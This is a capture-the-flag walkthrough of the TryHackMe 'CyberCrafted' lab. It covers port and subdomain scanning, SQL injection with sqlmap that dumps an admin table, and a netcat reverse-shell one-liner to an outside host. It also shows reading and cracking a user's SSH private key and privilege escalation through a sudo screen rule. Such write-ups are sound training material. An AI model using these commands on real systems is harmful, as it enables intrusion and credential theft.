## CyberCrafted
https://tryhackme.com/room/cybercrafted

## Enum
```
nmap -Pn -sC -sS -sV ip.thm -vv

Happy 25th Birthday to Nmap, may it live to be 125!

Scanning ip.thm (10.10.153.154) [1000 ports]
Discovered open port 80/tcp on 10.10.153.154
Discovered open port 22/tcp on 10.10.153.154

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk3jETo4Cogly65TvK7OYID0jjr/NbNWJd1TvT3mpDonj9KkxJ1oZ5xSBy+3hOHwDcS0FG7ZpFe8BNwe/ASjD91/TL/a1gH6OPjkZblyc8FM5pROz0Mn1JzzB/oI+rHIaltq8JwTxJMjTt1qjfjf3yqHcEA5zLLrUr+a47vkvhYzbDnrWEMPXJ5w9V2EUxY9LUu0N8eZqjnzr1ppdm3wmC4li/hkKuzkqEsdE4ENGKz322l2xyPNEoaHhEDmC94LTp1FcR4ceeGQ56WzmZe6CxkKA3iPz55xSd5Zk0XTZLTarYTMqxxe+2cRAgqnCtE1QsE7cX4NA/E90EcmBnJh5T
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLntlbdcO4xygQVgz6dRRx15qwlCojOYACYTiwta7NFXs9M2d2bURHdM1dZJBPh5pS0V69u0snOij/nApGU5AZo=
|   256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDbLLQOGt+qbIb4myX/Z/sYQ7cj20+ssISzpZCaMD4/u
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
🍾 🎂 🍾 HPB Nmap Senpai. 🥳

```
nmap -Pn -sT 10.10.153.154 -p- --open --min-rate 1000 -vv

Happy 25th Birthday to Nmap, may it live to be 125!

Not shown: 65237 closed tcp ports (conn-refused), 295 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT      STATE SERVICE   REASON
22/tcp    open  ssh       syn-ack
80/tcp    open  http      syn-ack
25565/tcp open  minecraft syn-ack
```
```
nmap -Pn -sC -sV -A cybercrafted.thm -p 25565

PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)

```

```
echo '10.10.153.154 cybercrafted.thm' >> /etc/hosts
```

![image](https://user-images.githubusercontent.com/6504854/187850551-b9588904-1184-4de4-bdb2-68018ac03a6b.png)

```
curl http://cybercrafted.thm/

<!DOCTYPE html>
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
</html>
```
🏴 Let's find subdomains.

```
ffuf -u http://cybercrafted.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.cybercrafted.thm" -fc 302 -t 100

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 438ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 481ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 520ms]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 442ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 434ms]
```

```
echo '10.10.91.246 www.cybercrafted.thm' >> /etc/hosts
echo '10.10.91.246 admin.cybercrafted.thm' >> /etc/hosts
echo '10.10.91.246 store.cybercrafted.thm' >> /etc/hosts
```

```
ffuf -u http://store.cybercrafted.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php -t 100 -timeout 60
-x http://127.0.0.1:8082

.htaccess               [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 2838ms]
.htpasswd.php           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 2849ms]
.htaccess.php           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 2894ms]
.hta.php                [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3209ms]
.hta                    [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3289ms]
.htpasswd               [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3253ms]
assets                  [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 892ms]
index.html              [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 957ms]
search.php              [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 1017ms]
server-status           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 950ms]
:: Progress: [9426/9426] :: Job [1/1] :: 98 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/187922810-0731167e-6c04-425d-a767-e049fda104ce.png)
![image](https://user-images.githubusercontent.com/6504854/187922412-1df8914d-2840-4096-9478-dceabe6d76a1.png)
![image](https://user-images.githubusercontent.com/6504854/187922535-8b27f645-d965-44e1-8ca8-87ae8b2ebf96.png)
🏴 The Prameter search has SQLi. Let's upload revers shell with sqlmap.


```
sqlmap -u "http://store.cybercrafted.thm/search.php" --data "search=Heart+of+the+Sea%27%27&submit=" --dbs --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp
```
```
sqlmap -u "http://store.cybercrafted.thm/search.php" --data "search=Heart+of+the+Sea%27%27&submit=" -D webapp --tables --batch

[22:45:56] [INFO] fetching tables for database: 'webapp'
Database: webapp
[2 tables]
+-------+
| admin |
| stock |
+-------+
```
```
sqlmap -u "http://store.cybercrafted.thm/search.php" --data "search=Heart+of+the+Sea%27%27&submit=" -D webapp -T admin --dump --batch

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

[22:48:30] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b************************************* | xX***************Xx |
| 4  | THM{********************************}    | web_flag            |
+----+------------------------------------------+---------------------+
```

![image](https://user-images.githubusercontent.com/6504854/187957130-c2a78ca9-0d45-4f83-91b8-641ab886944c.png)
![image](https://user-images.githubusercontent.com/6504854/187958949-d056c620-a864-45fa-b324-ca8a0fae01cf.png)
![image](https://user-images.githubusercontent.com/6504854/187959210-7cac0258-6b01-4e70-ae2c-8a438d319348.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```
🏴 いつものでOK。

## Flag
```
www-data@cybercrafted:/home/xx****************xx$ cd .ssh
cd .ssh
www-data@cybercrafted:/home/xx****************xx/.ssh$ ls -la
ls -la
total 16
drwxrwxr-x 2 xx***************xx xx***************xx 4096 Jun 27  2021 .
drwxr-xr-x 5 xx***************xx xx***************xx 4096 Oct 15  2021 ..
-rw-r--r-- 1 xx***************xx xx***************xx  414 Jun 27  2021 authorized_keys
-rw-r--r-- 1 xx***************xx xx***************xx 1766 Jun 27  2021 id_rsa

www-data@cybercrafted:/home/xx****************xx/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
-----END RSA PRIVATE KEY-----
```
🏴 I copied ssh key my local machine.

```
vi id_rsa

chmod 400 id_rsa

ssh -i id_rsa xx**************xx@cybercrafted.thm
Enter passphrase for key 'id_rsa':

ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
c********6      (id_rsa)

ssh -i id_rsa xx**************xx@cybercrafted.thm
Enter passphrase for key 'id_rsa':

xx**************xx@cybercrafted:~$
```

```
xx***************xx@cybercrafted:~$ id
uid=1001(xx***************xx) gid=1001(xx***************xx) groups=1001(xx***************xx),25565(minecraft)

find / -type f -name *flag* -group minecraft 2> /dev/null
/opt/minecraft/minecraft_server_flag.txt

cd /opt/minecraft/cybercrafted/plugins
xx***************xx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la

total 56
drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27  2021 .
drwxr-x--- 7 cybercrafted minecraft  4096 Jun 27  2021 ..
drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 LoginSystem
-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 LoginSystem_v.2.4.jar

xultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
xx***************xx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls -la
total 24
drwxr-x--- 2 cybercrafted minecraft 4096 Oct  6  2021 .
drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27  2021 ..
-rwxr-x--- 1 cybercrafted minecraft  667 Sep  1 15:53 language.yml
-rwxr-x--- 1 cybercrafted minecraft  943 Sep  1 15:53 log.txt
-rwxr-x--- 1 cybercrafted minecraft   90 Jun 27  2021 passwords.yml
-rwxr-x--- 1 cybercrafted minecraft   25 Sep  1 15:53 settings.yml
xx***************xx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: Java**************
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!

xx***************xx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password:

cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ id
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)

cd cybercrafted/
cybercrafted@cybercrafted:~$ ls -la

-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt

sudo -l
[sudo] password for cybercrafted:
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
```
![image](https://user-images.githubusercontent.com/6504854/187967980-c81e130e-7b46-479d-a770-1a4c86a6b790.png)

ctrl+A C

![image](https://user-images.githubusercontent.com/6504854/187968203-7acf7dc3-9f5a-4539-b96f-210728165a23.png)

Thank you for reading. Happy hacking 😄 😪

## Omake
🏴 I turned ffuf on -t 500 and failed to get correct response code.
```
 ffuf -u http://store.cybercrafted.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php -t 500 -timeout 60
-x http://127.0.0.1:8082

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://store.cybercrafted.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8082
 :: Timeout          : 60
 :: Threads          : 500
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd.php           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3981ms]
.htaccess.php           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 3984ms]
.hta                    [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 6090ms]
.hta.php                [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 6443ms]
.htaccess               [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 8870ms]
assets                  [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 1102ms]
.htpasswd               [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 22018ms]
emoticons               [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2830ms]
employee                [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2821ms]
employers               [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2825ms]
employers.php           [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2829ms]
employees               [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2832ms]
employees.php           [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 2832ms]
index.html              [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1594ms]
o.php                   [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3329ms]
oa_servlets             [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3371ms]
oauth/device/code       [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3350ms]
oauth/authorize         [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3360ms]
opendir.php             [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3024ms]
operator                [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3012ms]
operations.php          [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3014ms]
opml.php                [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3058ms]
opinions.php            [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3061ms]
opinion.php             [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3065ms]
operator.php            [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3071ms]
oprocmgr-status         [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3046ms]
openvpnadmin.php        [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3117ms]
order                   [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3039ms]
order-detail            [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3040ms]
order-detail.php        [Status: 200, Size: 1336, Words: 133, Lines: 27, Duration: 3030ms]
search.php              [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 1582ms]
server-status           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1939ms]
:: Progress: [9426/9426] :: Job [1/1] :: 309 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```
```
curl http://store.cybercrafted.thm/opinions.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at store.cybercrafted.thm Port 80</address>
</body></html>

curl http://store.cybercrafted.thm/order
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at store.cybercrafted.thm Port 80</address>
</body></html>
```
スレッド500まであげたら取りこぼしたっす。疲れだー。
